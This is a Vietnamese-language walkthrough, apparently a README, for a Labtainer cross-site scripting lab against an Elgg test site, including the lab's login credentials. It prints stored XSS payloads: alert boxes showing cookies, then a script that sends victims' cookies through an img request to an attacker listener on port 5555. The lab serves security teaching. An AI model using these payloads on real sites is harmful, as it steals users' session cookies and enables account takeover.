# Tấn công Cross Site Scripting vào máy chủ web

- Chạy lệnh: labtainer xsitetrong terminal của Labtainer
  
  ![image](https://github.com/user-attachments/assets/20b92a0d-37bc-4430-9df8-f5046b869a44)

- Chương trình sẽ hiển thị 3 terminal bao gồm “vuln-site”, “victim”, “attacker”.

  ![image](https://github.com/user-attachments/assets/a7d288d1-6afe-4995-995a-927b8e604705)


- Gõ lệnh: sudo systemctl restart httpd
- Đồng thời trình duyệt Firefox sẽ tự động khởi chạy trong vài giây.
  
  ![image](https://github.com/user-attachments/assets/e23e1bb5-db1c-4182-8ab5-854e8a5871b4)

- Open terminal victim gõ lệnh:
- firefox http://www.xsslabelgg.com

  ![image](https://github.com/user-attachments/assets/26725d2d-ad9d-4ebe-86e5-466df225ec56)

## Task 1: Sử dụng mã độc hại hiện thị cửa sổ cảnh báo
- Mục tiêu của nhiệm vụ này là nhúng một chương trình JavaScript vào profile Elgg của bạn, sao cho khi một người dùng khác xem hồ sơ của bạn, chương trình Javascript sẽ được thực thi và một cảnh báo được hiện thị. 

- Đăng nhập vào hệ thống bằng tài khoản `samy` với mật khẩu là `seedsamy`

  ![image](https://github.com/user-attachments/assets/3562a588-fb53-404e-adbe-4d3765807d5c)

- Vào mục More trên thanh taskbar - chọn member-chọn edit profile.
- Chương trình Javascript như sau:
  ```
  <script>alert('XSS');</script>
  ```
  ![image](https://github.com/user-attachments/assets/d74c305e-bdb4-4432-88fa-cb8af996c71f)


## Task 2: Sử dụng mã độc hại hiện thị Cookies trên cửa sổ cảnh báo
- Mục tiêu nhiệm vụ này tương tự task1 nhưng chúng ta sẽ hiện thị cookie người dùng.
- Chương trình Javascript như sau:
  
    ```
    <script>alert(document.cookie);</script>
    ```

    ![image](https://github.com/user-attachments/assets/4576fd65-c6ce-40e5-9259-33bc8dd2ba6f)

## Task 3: Ăn cắp Cookies từ máy của nạn nhân
- Trong nhiệm vụ này, kẻ tấn công tạo một mã Javascript gửi cookie người dùng về cho kẻ tấn công, mã Javascript sẽ gửi một HTTP request với cookie nạn nhân.
  ```
   <script>document.write('<img src=http://attacker_IP_address:5555?c='+ escape(document.cookie) + '>');</script>
  ```
- Khi Javascript chèn thẻ img vào, trình duyệt sẽ cố tải hình ảnh từ url điều này sẽ gửi một request cho kẻ tân công. Javascript đưa ra dưới đây sẽ gửi cookie đến cổng 5555 của máy kẻ tấn công, máy chủ kẻ tấn công sẽ in ra những gì nó nhận được. Máy chủ TCP nằm trong thư mục echoserver.
  
- Open terminal acttacker, vào thư mục run `./echoserv 5555` và chúng ta sẽ lắng nghe request của trình duyệt gửi cookie về cho kẻ tấn công.
  ```
  <script>document.write('<img src=http://172.25.0.3:5555?c='+ escape(document.cookie) + '>');</script>
  ```
  ![image](https://github.com/user-attachments/assets/ea46dd42-2e13-4dd7-b08a-d141b6aa85a1)
